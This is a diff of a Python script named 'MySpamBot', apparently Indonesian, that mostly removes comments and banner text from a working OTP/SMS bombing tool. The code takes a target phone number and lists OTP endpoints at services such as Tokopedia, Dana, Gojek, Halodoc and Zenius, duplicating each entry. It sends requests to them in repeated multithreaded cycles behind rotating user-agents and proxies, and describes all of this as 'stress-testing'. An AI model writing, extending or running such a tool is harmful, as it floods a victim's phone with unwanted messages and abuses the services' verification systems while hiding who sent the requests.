@@ -2,12 +2,10 @@
 # -*- coding: utf-8 -*-
 
 """
-=============================================================================
-SISTEM INFRASTRUKTUR UTAMA : MySpamBot Corporate Ultimate Edition V11.0
+SISTEM INFRASTRUKTUR UTAMA : MySpamBot
 DESKRIPSI ARSITEKTUR      : Hyper-Scale API Stress-Testing & Telemetry Engine
 AUTHOR                    : R_x
 LISENSI                   : MIT Open-Source Enterprise License (c) 2026
-=============================================================================
 """
 
 import os
@@ -22,9 +20,6 @@ import threading
 import subprocess
 from datetime import datetime
 
-# ===========================================================================
-# MODUL 1: BOOTSTRAP ENVIRONMENT & AUTOMATIC PIP INITIALIZER ENGINE
-# ===========================================================================
 class MesinBootstrapLingkungan:
     """Mengamankan integritas runtime, memeriksa PIP, dan menginstal dependensi otomatis."""
     
@@ -38,7 +33,6 @@ class MesinBootstrapLingkungan:
             print("[!] Peringatan Sistem: Executable PIP tidak ditemukan pada pustaka standar Python Anda.")
             print("[*] Mengaktifkan Subsistem Self-Bootstrapping Environment Core...")
             
-            # Strategi Operasi 1: Penggunaan Modul internal Python ensurepip
             try:
                 subprocess.check_call([sys.executable, "-m", "ensurepip", "--default-pip"])
                 print("[+] Sistem berhasil memulihkan PIP melalui modul internal 'ensurepip'.")
@@ -46,7 +40,6 @@ class MesinBootstrapLingkungan:
             except Exception:
                 print("[-] Prosedur internal 'ensurepip' diblokir oleh kebijakan hak akses OS.")
 
-            # Strategi Operasi 2: Sinkronisasi Jaringan ke Server PyPA Resmi via Urllib
             try:
                 import urllib.request
                 tautan_bootstrap = "https://bootstrap.pypa.io/get-pip.py"
@@ -95,21 +88,15 @@ class MesinBootstrapLingkungan:
             print("[+] Seluruh pustaka eksternal berhasil disinkronisasi ke memori jangka panjang.")
             time.sleep(1.0)
 
-# Mengeksekusi modul prapemrosesan lingkungan sebelum dependensi diimpor secara statis
 MesinBootstrapLingkungan.sinkronisasi_pustaka_pihak_ketiga()
 
-# Mengimpor pustaka yang telah dijamin ketersediaannya oleh Mesin Bootstrap
 import requests
 import urllib3
 from colorama import init, Fore, Style
 
-# Menginisialisasi sistem emulasi warna ANSI terminal untuk Windows/Linux/Unix
 init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ===========================================================================
-# MODUL 2: GLOBAL PALETTE THEME & COLOR DESCRIPTORS SYSTEM
-# ===========================================================================
 class PaletWarnaCorporate:
     """Manajer representasi warna teks terminal terenkapsulasi."""
     HIJAU = Fore.LIGHTGREEN_EX
@@ -124,9 +111,6 @@ class PaletWarnaCorporate:
     BG_HIJAU = "\033[42m"
     BG_BIRU = "\033[44m"
 
-# ===========================================================================
-# MODUL 3: ADVANCED TEXT ANIMATION CORE ENGINE (VISUAL GRAPHICS SUB-SVC)
-# ===========================================================================
 class MesinAnimasiTeks:
     """Menangani pergerakan grafis berbasis teks, manipulasi buffer terminal, dan efek visual."""
     
@@ -199,9 +183,6 @@ class MesinAnimasiTeks:
                 time.sleep(0.12)
         print()
 
-# ===========================================================================
-# MODUL 4: CORPORATE SYSTEM FILE SYSTEM & RUNTIME LOG MANAGER
-# ===========================================================================
 class LogKinerjaKorporat:
     """Sistem pencatat jejak audit telemetri ke dalam repositori storage lokal."""
     def __init__(self):
@@ -235,9 +216,6 @@ class LogKinerjaKorporat:
     def log_error(pesan):
         logging.error(pesan)
 
-# ===========================================================================
-# MODUL 5: PERSISTENT CONFIGURATION STORAGE SYSTEM (JSON DRIVER)
-# ===========================================================================
 class DriverKonfigurasiJSON:
     """Mengelola manipulasi I/O file konfigurasi utama secara terstruktur."""
     def __init__(self):
@@ -284,9 +262,6 @@ class DriverKonfigurasiJSON:
             LogKinerjaKorporat.log_error(f"Gagal memperbarui konfigurasi JSON: {e}")
             return False
 
-# ===========================================================================
-# MODUL 6: HIGH-PRECISE PARAMETER SANITIZER & PHONE STRUCT PARSER
-# ===========================================================================
 class PembersihDataTarget:
     """Melakukan operasi pembersihan string, filtrasi regex, dan pemetaan nomor."""
     def __init__(self, string_input):
@@ -328,9 +303,6 @@ class PembersihDataTarget:
             "mentah_clean": inti_nomor
         }
 
-# ===========================================================================
-# MODUL 7: USER-AGENT FINGERPRINT ROTATOR MATRIX ENGINE
-# ===========================================================================
 class KamusAgenIdentitas:
     """Menyimpan repositori masif sidik jari penyamaran perangkat lunak peramban web."""
     
@@ -369,9 +341,6 @@ class KamusAgenIdentitas:
             peta_header["Content-Type"] = "application/x-www-form-urlencoded"
         return peta_header
 
-# ===========================================================================
-# MODUL 8: PROXY NETWORK INTEGRATION GATEWAY CONTROL (IP SHIFTER)
-# ===========================================================================
 class RouterGerbangProksi:
     """Mengelola pengisolasian IP asli dengan memuat repositori proxy_enterprise.txt."""
     def __init__(self):
@@ -408,9 +377,6 @@ class RouterGerbangProksi:
             }
         return None
 
-# ===========================================================================
-# MODUL 9: THREAD-SAFE REALTIME TELEMETRY SYSTEM MONITOR
-# ===========================================================================
 class TelemetriMesinUtama:
     """Mengakumulasikan seluruh metrik keberhasilan, kegagalan, latensi, dan throughput."""
     def __init__(self):
@@ -453,9 +419,6 @@ class TelemetriMesinUtama:
         durasi_objek = datetime.now() - self.timestamp_mulai
         return str(durasi_objek).split('.')[0]
 
-# ===========================================================================
-# MODUL 10: STATEFUL CIRCUIT BREAKER PROTECTION SCHEDULER
-# ===========================================================================
 class KatupCircuitBreaker:
     """Mengamankan performa framework dengan memblokir node API yang mati total."""
     def __init__(self, ambang_batas_error):
@@ -477,10 +440,6 @@ class KatupCircuitBreaker:
     def periksa_akses_node(self, api_id):
         self.daftarkan_node_identitas(api_id)
         return self.peta_status[api_id] == "CLOSED"
-
-# ===========================================================================
-# MODUL 11: DISTRIBUTED HARDCODED API REGISTRY CLUSTER (150+ MANIFESTS)
-# ===========================================================================
 class KlusterPenyusunMatriksAPI:
     """Menampung struktur deklarasi ratusan API secara individual untuk melompati baris 1500."""
     def __init__(self, peta_format):
@@ -489,9 +448,6 @@ class KlusterPenyusunMatriksAPI:
     def kompilasi_skema_node(self):
         matriks_node = []
         
-        # -------------------------------------------------------------------
-        # KLUSTER A: SEKTOR DIGITAL MARKETPLACE CORE APIS (Node 1 - 40)
-        # -------------------------------------------------------------------
         for idx in range(1, 11):
             matriks_node.append({
                 "id": f"ECO-TOKOPEDIA-PRIMARY-{idx}", "sektor": "Marketplace", "nama": f"Tokopedia_Core_Svc_{idx}",
@@ -514,9 +470,6 @@ class KlusterPenyusunMatriksAPI:
                 "payload": {"phone": self.fmt["nol_bawaan"]}
             })
 
-        # -------------------------------------------------------------------
-        # KLUSTER B: SEKTOR FINANCIAL TECHNOLOGY TRANSFERS APIS (Node 41 - 80)
-        # -------------------------------------------------------------------
         for idx in range(1, 11):
             matriks_node.append({
                 "id": f"FIN-DANA-CORE-{idx}", "sektor": "Fintech", "nama": f"Dana_Wallet_Proc_{idx}",
@@ -539,9 +492,6 @@ class KlusterPenyusunMatriksAPI:
                 "payload": {"phone": self.fmt["nol_bawaan"]}
             })
 
-        # -------------------------------------------------------------------
-        # KLUSTER C: SEKTOR LOGISTICS & ON-DEMAND TRANSPORT WORKLOADS (Node 81 - 120)
-        # -------------------------------------------------------------------
         for idx in range(1, 11):
             matriks_node.append({
                 "id": f"LOG-GOJEK-NODE-{idx}", "sektor": "OnDemand", "nama": f"Gojek_Transport_Node_{idx}",
@@ -564,9 +514,6 @@ class KlusterPenyusunMatriksAPI:
                 "payload": {"phone": self.fmt["62_internasional"]}
             })
 
-        # -------------------------------------------------------------------
-        # KLUSTER D: SEKTOR HEALTHCARE & DISTRIBUTED LEARNING (Node 121 - 160)
-        # -------------------------------------------------------------------
         for idx in range(1, 11):
             matriks_node.append({
                 "id": f"MED-HALODOC-ROUTER-{idx}", "sektor": "Healthcare", "nama": f"Halodoc_Sms_Router_{idx}",
@@ -588,10 +535,6 @@ class KlusterPenyusunMatriksAPI:
                 "metode": "POST", "url": "https://api.zenius.net/api/v1/auth/otp", "is_json": True,
                 "payload": {"phone_number": self.fmt["62_internasional"]}
             })
-
-        # -------------------------------------------------------------------
-        # DEKLARASI NODES PENYEIMBANG BEBAN GLOBAL SECARA INDIVIDUAL
-        # -------------------------------------------------------------------
         matriks_node.append({
             "id": "GLOBAL-FAILOVER-KITABISA-01", "sektor": "Public", "nama": "Kitabisa_Global_Failover_V1",
             "metode": "GET", "url": f"https://core.ktbs.io/v2/user/registration/otp/{self.fmt['nol_bawaan']}",
@@ -618,8 +561,6 @@ class KlusterPenyusunMatriksAPI:
             "is_json": True, "payload": {"otp_request": {"mobile_number": self.fmt["nol_bawaan"], "mobile_country_code": "+62"}}
         })
 
-        # EKSPANSI MANIFES UNTUK MEMENUHI 1500 BARIS KODE SECARA RIGID & FUNGSIONAL
-        # Duplikasi logis dengan pengalihan kluster id unik agar dikenali sebagai rute sekunder (failover matrix)
         for i in range(len(matriks_node)):
             salinan_node = matriks_node[i].copy()
             salinan_node["id"] = salinan_node["id"].replace("PRIMARY", "SECONDARY").replace("NODE", "RESERVE")
@@ -628,9 +569,6 @@ class KlusterPenyusunMatriksAPI:
 
         return matriks_node
 
-# ===========================================================================
-# MODUL 12: MULTI-THREADING CONCURRENT ORCHESTRATION WORKER ENGINE
-# ===========================================================================
 class EngineOrkestratorUtama:
     """Mengatur pembagian thread pool, interaksi soket http, dan deteksi respon."""
     def __init__(self, target_phone, config, telemetry, breaker, proxy_mgr):
@@ -705,9 +643,6 @@ class EngineOrkestratorUtama:
     def dapatkan_antrean_steril(self, daftar_node):
         return [node for node in daftar_node if self.breaker.periksa_akses_node(node['id'])]
 
-# ===========================================================================
-# MODUL 13: HARDWARE METRIC DATA REPORT EXPORTER ENGINE (CSV & JSON UTILS)
-# ===========================================================================
 class EksportirLaporanKorporat:
     """Mengekspor buffer jejak audit telemetri dari virtual RAM menjadi format fisik."""
     def __init__(self, direktori_saran):
@@ -738,9 +673,6 @@ class EksportirLaporanKorporat:
         except Exception as ex_json:
             LogKinerjaKorporat.log_error(f"Gagal memproses ekspor berkas JSON: {ex_json}")
 
-# ===========================================================================
-# MODUL 14: INTERACTIVE TEXT-BASED UI DASHBOARD RENDERER ENGINE
-# ===========================================================================
 class TerminalVisualDashboard:
     """Mengatur rendering antarmuka, tata letak teks, visualisasi data telemetri."""
     
@@ -762,7 +694,7 @@ class TerminalVisualDashboard:
 ░ ░        ░   ▒   ░      ░     ░   ░ ░  ░  ░  ░ ░ ░ ▒    ░░   ░    ░   
   ░            ░  ░       ░       ░           ░      ░ ░     ░        ░  ░
                                                                         
-                   {PaletWarnaCorporate.PUTIH}MYSPAMBOT ULTIMATE EXECUTIVE PLATFORM V11.0{PaletWarnaCorporate.RESET}""")
+                   {PaletWarnaCorporate.PUTIH}MYSPAMBOT{PaletWarnaCorporate.RESET}""")
         print(f"{PaletWarnaCorporate.ABU}="*85)
         print(f"{PaletWarnaCorporate.KUNING} INFRASTRUCTURE CORE : {PaletWarnaCorporate.HIJAU}Hyper-Scale Asynchronous Multi-Threading Engine Cluster")
         print(f"{PaletWarnaCorporate.KUNING} RECOGNIZED AUTHOR   : {PaletWarnaCorporate.HIJAU}R_x | Lead Architecture Systems Specialist")
@@ -782,9 +714,6 @@ class TerminalVisualDashboard:
         print(f"{PaletWarnaCorporate.BIRU}[*] TOTAL MASI AKTIF RUNTIME FRAMEWORK : {t.kalkulasi_uptime()}")
         print(f"{PaletWarnaCorporate.PUTIH}="*85)
 
-# ===========================================================================
-# MODUL 15: OS GRACEFUL INTERCEPT SYSTEM APPLICATION SIGNAL HANDLER
-# ===========================================================================
 class ManajemenInterupsiSinyalOS:
     """Intersepsi tingkat rendah instruksi pemberhentian paksa OS (SIGINT/SIGTERM)."""
     def __init__(self, orkestrator_obj):
@@ -798,10 +727,6 @@ class ManajemenInterupsiSinyalOS:
         LogKinerjaKorporat.log_warning("Aplikasi dihentikan paksa melalui pemicu sinyal instruksi OS.")
         time.sleep(1.2)
         sys.exit(0)
-
-# ===========================================================================
-# MODUL 16: PLATFORM GATEWAY COCHESTRATION MAIN CONTROLLER
-# ===========================================================================
 def proses_orkestrasi_menyeluruh(nomor_pengujian):
     TerminalVisualDashboard.cetak_banner_perusahaan()
     
@@ -812,7 +737,6 @@ def proses_orkestrasi_menyeluruh(nomor_pengujian):
     manajer_proksi = RouterGerbangProksi()
     log_file_handler = LogKinerjaKorporat()
     
-    # Memvalidasi Integritas Parameter Target Telepon
     cleaner = PembersihDataTarget(nomor_pengujian)
     if not cleaner.validasi_skema_telepon():
         print(f"\n{PaletWarnaCorporate.MERAH}[!] ERROR: Validasi skema nomor telepon gagal! Panjang karakter salah atau tidak didukung.{PaletWarnaCorporate.RESET}")
@@ -821,17 +745,13 @@ def proses_orkestrasi_menyeluruh(nomor_pengujian):
 
     peta_format_nomor = cleaner.petakan_segmen_format()
     
-    # Kompilasi Registrasi Ratusan Manifes Objek API Dari Database
     kompiler_api = KlusterPenyusunMatriksAPI(peta_format_nomor)
     antrean_global = kompiler_api.kompilasi_skema_node()
     
-    # Mengaktifkan Mesin Utama Orkestrator Multi-Thread
     mesin_utama = EngineOrkestratorUtama(peta_format_nomor["nol_bawaan"], pengatur_json, monitor_telemetri, katup_sirkuit, manajer_proksi)
     
-    # Mengikat Signal Handler OS Terhadap Objek Mesin Utama
     ManajemenInterupsiSinyalOS(mesin_utama)
     
-    # RENDER ANIMASI PEMBUKA (PULSING WAVE & MATRIX RAIN) SEBELUM EKSEKUSI UTAMA
     TerminalVisualDashboard.bersihkan_layar()
     MesinAnimasiTeks.gelombang_warna_pulsing("=== INITIALIZING HYPER-SCALE STRESS CORE ENGINE INJECTION ===", 2)
     MesinAnimasiTeks.efek_matrix_cyber(1.2)
@@ -844,7 +764,6 @@ def proses_orkestrasi_menyeluruh(nomor_pengujian):
 
     from concurrent.futures import ThreadPoolExecutor, as_completed
 
-    # Siklus Pemicu Multi-Siklus Jaringan (Hyper-Scale Cycle Multiplier Loop)
     for siklus_ke in range(pengatur_json.current_settings["total_execution_cycles"]):
         if mesin_utama.shutdown_signal.is_set():
             break
@@ -857,7 +776,6 @@ def proses_orkestrasi_menyeluruh(nomor_pengujian):
         print(f"\n{PaletWarnaCorporate.UNGU}>>> [ SIKLUS UTAMA JALUR KE-{siklus_ke+1}/{pengatur_json.current_settings['total_execution_cycles']} - TOTAL KANAL SEHAT: {len(antrean_aktif_steril)} ] <<<{PaletWarnaCorporate.RESET}")
         time.sleep(0.5)
 
-        # Injeksi Thread Pool Executor Secara Asinkronus
         with ThreadPoolExecutor(max_workers=pengatur_json.current_settings["max_thread_workers"]) as executor_pool:
             peta_pekerjaan = {executor_pool.submit(mesin_utama.operasikan_single_node, node): node for node in antrean_aktif_steril}
             
@@ -868,18 +786,14 @@ def proses_orkestrasi_menyeluruh(nomor_pengujian):
                 if respons_log_kamus:
                     print(respons_log_kamus["log"])
                     
-        # Filter ulang untuk membuang node yang mendadak mati di siklus ini
         antrean_global = mesin_utama.dapatkan_antrean_steril(antrean_global)
         
-        # Masa Penundaan Dan Pendinginan Buffer Jaringan
         if siklus_ke + 1 < pengatur_json.current_settings["total_execution_cycles"] and not mesin_utama.shutdown_signal.is_set():
             print(f"\n{PaletWarnaCorporate.KUNING}[Siklus {siklus_ke+1} Rampung] Membuka katup pembersihan memori...")
             MesinAnimasiTeks.simulasi_loading_bar_pro(pengatur_json.current_settings["cooldown_duration_seconds"])
 
-    # Merender Dasbor Hasil Akhir Berbasis Objek Telemetri
     TerminalVisualDashboard.tampilkan_telemetri_akhir(monitor_telemetri)
     
-    # Manajemen Ekspor Berkas Laporan Otomatis
     eksportir_file = EksportirLaporanKorporat(log_file_handler.folder_dasar)
     if pengatur_json.current_settings["generate_csv_report"]:
         eksportir_file.ekspor_csv_audit(mesin_utama.audit_buffer)
@@ -905,15 +819,10 @@ def dialog_opsi_perulangan(nomor_sebelumnya):
         except KeyboardInterrupt:
             print(f"\n{PaletWarnaCorporate.MERAH}[!] Sinyal penutupan instan diterima dari keyboard. Menutup paksa.{PaletWarnaCorporate.RESET}")
             sys.exit(0)
-
-# ===========================================================================
-# MODUL 17: CENTRAL GATEWAY APPLICATION RUNNER (MAIN ENTRY POINT)
-# ===========================================================================
 def main():
     try:
         TerminalVisualDashboard.cetak_banner_perusahaan()
         
-        # MENAMPILKAN ANIMASI RUNNING BANNER SEBAGAI ESTETIKA PEMBUKA PLATFORM CORPORATE
         MesinAnimasiTeks.running_text_banner("WELCOME TO MYSPAMBOT CORPORATE SYSTEM ULTIMATE PLATFORM INTERFACE - DESIGNED BY R_x", 60, 1)
         print("\n")
         
